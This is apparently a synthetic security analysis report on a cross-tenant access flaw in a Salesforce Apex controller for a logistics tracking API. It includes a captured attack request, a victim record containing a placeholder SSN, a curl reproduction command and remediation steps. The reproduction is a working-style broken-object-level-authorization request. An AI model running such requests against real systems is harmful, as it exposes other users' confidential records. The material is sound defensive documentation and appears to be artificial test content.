# Security Analysis Report
**System:** FreightLens Tracking API (Salesforce-Integrated)
**Domain:** Logistics / Supply Chain
**Example ID:** SF-0113
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant / cross-tenant access on `AccountController.getAccounts` — attacker reads any logistics Account record belonging to another user |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on Account Object (Pattern 1.5)

### Summary
The Apex controller `AccountController` on FreightLens Tracking API (`9f95ecee.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Account object. Per §5.0 Pattern 1.5, the attacker reads Account `001ECEE` belonging to another user by substituting `accountId`.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getAccountDetails(String accountId, ...)` while the Aura descriptor in §6.0 is `c.AccountController.getAccounts`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.AccountController.getAccounts`
**Affected endpoint:** `POST https://9f95ecee.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://9f95ecee.lightning.force.com/aura
Authorization: Bearer 00D9F95ECEE!AR9f95ecee...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D9F95ECEE!AR9f95ecee...

message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN",
"params":{"accountId":"001ECEE","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Account Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001ECEE", "Name": "Victim Account Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-33-8458"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D9F95ECEE!AR9f95ecee..."
curl -s -X POST "https://9f95ecee.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"001ECEE","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-33-8458
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class AccountController { ... }`
2. `WHERE Id = :accountId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
